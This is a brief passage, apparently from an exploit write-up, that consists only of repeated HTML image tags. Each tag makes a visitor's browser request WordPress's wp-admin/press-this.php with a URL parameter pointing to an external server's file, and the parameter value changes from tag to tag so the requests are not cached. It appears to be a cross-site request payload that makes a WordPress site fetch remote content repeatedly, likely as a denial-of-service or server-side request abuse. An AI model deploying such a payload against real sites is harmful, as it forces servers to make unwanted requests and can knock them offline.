	```
	<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
	<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
	<img src='http://<wp server>/wp-admin/press-this.php?u=http%3A%2F%2F<external server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
	...
	```
